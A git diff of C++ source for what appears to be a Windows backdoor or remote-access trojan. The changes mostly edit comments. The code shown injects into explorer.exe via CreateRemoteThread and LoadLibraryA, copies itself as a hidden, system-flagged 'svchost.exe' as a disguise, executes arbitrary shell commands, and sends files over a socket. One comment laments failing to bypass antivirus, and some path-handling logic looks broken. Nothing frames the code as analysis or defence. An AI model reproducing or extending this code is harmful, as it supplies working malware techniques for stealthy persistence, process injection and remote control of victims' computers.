@@ -79,9 +79,8 @@ bool RemoveFromStartup() {
     return (result == ERROR_SUCCESS);
 }
 
-// END MODIFICATION
-// MODIFICATION: Process injection functions to inject into explorer.exe
-// Find process ID by name
+//process injection functions to inject into explorer.exe and find it by Name
+
 DWORD FindProcessId(const std::wstring& processName) {
     PROCESSENTRY32W processEntry;
     processEntry.dwSize = sizeof(PROCESSENTRY32W);
@@ -104,7 +103,7 @@ DWORD FindProcessId(const std::wstring& processName) {
     return 0;
 }
 
-//check if already injected
+//check if it's injected
 bool IsInjectedIntoExplorer() {
     DWORD currentPid = GetCurrentProcessId();
     DWORD parentPid = 0;
@@ -126,13 +125,13 @@ bool IsInjectedIntoExplorer() {
         } while (Process32NextW(snapshot, &processEntry));
     }
 
-    // Now find the parent process name
+    //found the parent process name
     if (parentPid != 0) {
         if (Process32FirstW(snapshot, &processEntry)) {
             do {
                 if (processEntry.th32ProcessID == parentPid) {
                     CloseHandle(snapshot);
-                    // Check if parent is explorer.exe
+                    //check if parent is explorer.exe
                     return (std::wstring(processEntry.szExeFile) == L"explorer.exe");
                 }
             } while (Process32NextW(snapshot, &processEntry));
@@ -143,18 +142,16 @@ bool IsInjectedIntoExplorer() {
     return false;
 }
 
-// inject DLL or code into target process
+
 bool InjectIntoProcess(DWORD processId) {
-    //core function for process injection
+   
     char szPath[MAX_PATH];
 
-    // Get the full path of the current executable
     if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
         std::cerr << "Failed to get executable path." << std::endl;
         return false;
     }
 
-    // Open the target process
     HANDLE hProcess = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
@@ -167,8 +164,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Allocate memory in the target process for the DLL path
-    LPVOID pRemoteMemory = VirtualAllocEx(
+    LPVOID pRemoteMemory = VirtualAllocEx( //memory allocate
         hProcess,
         NULL,
         strlen(szPath) + 1,
@@ -182,7 +178,6 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Write the DLL path to the allocated memory
     if (!WriteProcessMemory(hProcess, pRemoteMemory, szPath, strlen(szPath) + 1, NULL)) {
         std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
@@ -190,8 +185,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Get the address of LoadLibraryA
-    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); //get address
     if (pLoadLibrary == NULL) {
         std::cerr << "Failed to get LoadLibraryA address." << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
@@ -199,7 +193,6 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Create a remote thread to load the DLL
     HANDLE hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -220,18 +213,17 @@ bool InjectIntoProcess(DWORD processId) {
     std::cout << "Successfully injected into process!" << std::endl;
     std::cout << "Process ID: " << processId << std::endl;
 
-    // Wait for the thread to finish
     WaitForSingleObject(hThread, INFINITE);
 
-    // Cleanup
+
     CloseHandle(hThread);
     VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
     CloseHandle(hProcess);
 
     return true;
 }
-// Copy executable to Windows directory and create scheduled task
 
+//copy executable to Windows directory and create scheduled task
 bool SetupPersistenceWithInjection() {
     if (IsInjectedIntoExplorer()) {
         std::cout << "Already running inside explorer.exe, skipping injection." << std::endl;
@@ -240,30 +232,29 @@ bool SetupPersistenceWithInjection() {
     char szCurrentPath[MAX_PATH];
     char szTargetPath[MAX_PATH];
 
-    // Get current executable path
+    //Get current executable path
     if (GetModuleFileNameA(NULL, szCurrentPath, MAX_PATH) == 0) {
         std::cout << "returnd from here lol" << std::endl;
         return false;
     }
     strcat_s(szTargetPath, "C:\\svchost.exe"); //disguise LoL
-    // Copy to Windows directory with hidden name
+    //Copy to Windows directory with hidden name
     GetWindowsDirectoryA(szTargetPath, MAX_PATH);
     
 
-    // Copy file if not already there
+    //copy file if not there
     if (GetFileAttributesA(szTargetPath) == INVALID_FILE_ATTRIBUTES) {
         if (!CopyFileA(szCurrentPath, szTargetPath, FALSE)) {
-            std::cerr << "Failed to copy file. Error: " << GetLastError() << std::endl; //failed to run with AV survilliance, root priviledge needed!
+            std::cerr << "Failed to copy file. Error: " << GetLastError() << std::endl; //failed to run with AV survilliance, root priviledge needed! well honestly me somehow cant byPass iT
             return false;
         }
 
-        // Set file as hidden and system
+        //set file as hidden and system
         SetFileAttributesA(szTargetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
         std::cout << "Copied executable to: " << szTargetPath << std::endl;
     }
 
-    // Find explorer.exe process
     DWORD explorerPid = FindProcessId(L"explorer.exe");
     if (explorerPid == 0) {
         std::cerr << "Failed to find explorer.exe" << std::endl;
@@ -272,38 +263,31 @@ bool SetupPersistenceWithInjection() {
 
     std::cout << "Found explorer.exe with PID: " << explorerPid << std::endl;
 
-    // Inject into explorer.exe
     return InjectIntoProcess(explorerPid);
 }
 
 std::string exec(const char* cmd) {
-    // Pipe pointer to hold the output stream of the command
+
     FILE* pipe = nullptr;
 
-    // Use _popen (Windows) to execute the command and open a pipe to read its output
+
 #ifdef _WIN32
     pipe = _popen(cmd, "r");
 #else
-    // On Linux/macOS, use popen (and the 'ls -l' command would be used instead of 'dir')
     pipe = popen(cmd, "r");
 #endif
-
-    // Check if the pipe opened successfully
     if (!pipe) {
-        // Throw an exception if popen failed
         throw std::runtime_error("Failed to execute command via popen/ _popen!");
     }
 
-    // Buffer to read output chunks
     char buffer[128];
     std::string result = "";
 
-    // Read data from the pipe until the end of the file (EOF)
     while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
         result += buffer;
     }
 
-    // Close the pipe and wait for the command to finish
+
     int status = -1;
 #ifdef _WIN32
     status = _pclose(pipe);
@@ -312,8 +296,7 @@ std::string exec(const char* cmd) {
 #endif
 
     if (status == -1) {
-        // Handle closure error (though often ignored for simple commands)
-        // For robustness, we check it here.
+        //whatever
     }
 
     return result;
@@ -341,7 +324,7 @@ std::string stripFirstWord(std::string sentence, std::string firstWord) {
     return sentence.substr(startPos);
 }
 
-// Function to send a file, -1 means cant open file or error, 0 means fine
+// Function to send a file, -1 means cant open file or error, 0 means OK
 int fileSend(const char* filePath, SOCKET transferSocket) {
     std::ifstream file(filePath, std::ios::binary | std::ios::ate);
     if (!file) {
@@ -575,3 +558,4 @@ int main() {
     WSACleanup();
     return 0;
 }
+
